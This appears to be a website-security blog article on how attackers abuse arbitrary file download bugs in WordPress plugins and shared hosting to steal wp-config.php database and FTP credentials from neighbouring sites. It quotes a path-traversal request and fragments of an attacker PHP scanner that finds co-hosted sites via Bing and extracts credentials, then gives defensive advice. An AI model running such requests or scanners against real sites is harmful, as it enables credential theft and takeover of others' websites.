@@ -1,0 +1,70 @@
+Hacking WordPress Sites on Shared Servers
+
+A website is only as safe as the weakest link on its shared server. Once a hacker gains access to one site on the server, they can easily infect other sites that share the same server permissions. This is called cross-site contamination. When it comes to WordPress websites, the core structure is well known by hackers.
+WordPress users understand that wp-config.php files contain database credentials. It is important to prevent strangers from being able to read this sensitive file. If attackers steal those database credentials, they can, for example, create WordPress admin users or inject spam into posts.
+There are two things that most hosting companies and site owners do to prevent these sorts of hacks:
+
+Make wp-config.php unreadable by anyone but the site owner (and the web server process), i.e., a 400 permission.
+Make it impossible to connect to the database from external IPs (other than 127.0.0.1 or outside of the host’s subnetwork).
+
+These two steps allow you to avoid lots of problems… unless your site has an arbitrary file download vulnerability.
+Arbitrary File Download Vulnerability
+The arbitrary file download vulnerability allows attackers to craft a request to your site that will return the content of any file on your server (if the web server process has permission to read it). The most notorious example of such a vulnerability is the security hole in old versions of the extremely popular RevSlider plugin that led to the compromise of hundreds of thousands of WordPress sites since its disclosure back in 2014.
+This is a typical request seen in hacked site logs then:
+http://victim.com/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
+Hackers used this request to download the content of wp-config.php and then use the database credentials to create malicious WordPress admin users.
+Hardening That Didn’t Help
+Would the 400 permissions of wp-config.php prevent this attack?
+No.  The file was accessed by the web server process that had read access to the file (if it didn’t, WordPress wouldn’t work).
+What about preventing connections to the database from outside of the host’s network or even from any server except localhost?
+Sure. After stealing the database credentials, hackers can’t log in from their computers. So we’re good, aren’t we? Unfortunately, there is a workaround and we regularly see hackers using it.
+Shared Servers
+The hackers can connect to the WordPress database from the same server (network) as the site you want to hack. How can they do this if they haven’t broken into the site yet? The answer is shared servers. Attackers use a previously compromised site to discover and hack other WordPress sites on the same server.
+Scanning for Vulnerable Sites
+There are several popular scripts that leverage Bing’s ip: command to automate the discovery of vulnerable sites on the same IP address.
+Here is one example:
+$sites = array_map("site", bing("ip:$ip"));
+$un=array_unique($sites);
+echo "[+] Scanning -> ", $ip, ""."\n";
+echo "Found : ".count($sites)." sites\n\n";
+foreach($un as $pok){
+$linkof='/wp-content/themes/vulnerable-theme/css/css.php?files= ../../../../wp-config.php';
+$dn=($bda).($linkof);
+$file=@file_get_contents($dn);
+if(eregi('DB_HOST',$file) and !eregi('FTP_USER',$file) ){
+echo "[+] Scanning => ".$bda."\n\n";
+echo "[+] DB NAME : ".findit($file,"DB_NAME', '","');")."\n\n";
+echo "[+] DB USER : ".findit($file,"DB_USER', '","');")."\n\n";
+echo "[+] DB PASS : ".findit($file,"DB_PASSWORD', '","');")."\n\n";
+echo "[+] DB host : ".findit($file,"DB_HOST', '","');")."\n\n";
+...
+This script uses the bing() function to find indexed WordPress sites on the server. For every site found, it tries to fetch the URL that will return the content of the wp-config.php file. If the site doesn’t have the vulnerability, this step is skipped. The fetched wp-config.php is parsed and the database credentials of the additional WordPress sites are now available to the hackers.
+In addition to database credentials, the same script can steal FTP credentials from wp-config.php (when the web server process doesn’t have permission to modify files, sites have the option to configure WordPress updates via FTP).
+elseif(eregi('DB_HOST',$file) and eregi('FTP_USER',$file)){
+echo "FTP user : ".findit($file,"FTP_USER','","');")."\n\n";
+echo "FTP pass : ".findit($file,"FTP_PASS','","');")."\n\n";
+echo "FTP host : ".findit($file,"FTP_HOST','","');")."\n\n";
+}
+Given that a typical shared server can host more than a thousand different sites, the chances of finding other vulnerable sites are pretty high. As you can see this script allows hackers to quickly collect database, sometimes FTP credentials, from any other vulnerable WordPress sites on the same server as the site that attackers already have access to.
+With the list of database credentials, they can use the same hacked site to run other scripts that connect to the database. Since the script works on the same server as the potential victims, this connection will not be blocked. From here, attackers can create new admin users on every vulnerable site, or simply deface the site by changing their title (when the hacker’s only motivation is to brag on Zone-H).
+Subnetwork-Level Attacks
+As you might know, some hosting providers have dedicated database servers. This allows sites from many different web servers to connect to the same database server. In such environments, database servers are configured to allow connections from IPs on the same sub-network. This makes mass hacks using stolen database credentials even more successful. Hackers need only one compromised site per subnetwork (instead of one per IP) to start such an attack.
+In this case, the beginning of the script looks like this:
+$ip=trim(fgets(STDIN,1024));
+$ip = explode('.',$ip);
+$ip = $ip[0].'.'.$ip[1].'.'.$ip[2].'.';
+for($i=0;$i <= 255;$i++)
+{
+$sites = array_map("site", bing("ip:$ip.$i wordpress"));
+…
+Assessing the Threat and Protecting Your Site
+As you know, the chain is only as strong as its weakest link. This also applies to website security. We always emphasize the factor of cross-contaminations; when one neglected site can cause constant reinfection of many up-to-date and hardened sites that share the same server account.
+This article shows that the weakest link can be a site that doesn’t belong to you and that you don’t know anything about – it just happened to share the same server as your site (and thousands of other third-party sites). In these cases, your site can be hacked even if you properly set wp-config.php permissions and your database doesn’t allow external connections.
+Of course, hackers still need to steal the database credentials, which can happen if the software that you use on your site (themes, plugins, WordPress itself, etc.) has known or undisclosed vulnerabilities (zero-days). No software can guarantee that it is free from security bugs.
+To prevent attacks that leverage compromised neighbor sites you should try to eliminate as many weak links as possible.
+
+Move your site to a dedicated server, or,
+Fully patch your website so malicious vulnerability scanners will not be able to find security holes on your site.
+
+Any patching strategy should consider zero-day vulnerabilities that software developers don’t know about, and thus don’t have patches for yet. A robust monitoring solution can help you quickly audit and recover from a WordPress infection.
+You can also benefit from a website firewall that provides virtual patching and intelligent protection against attacks that leverage security flaws, including undisclosed zero-day vulnerabilities.
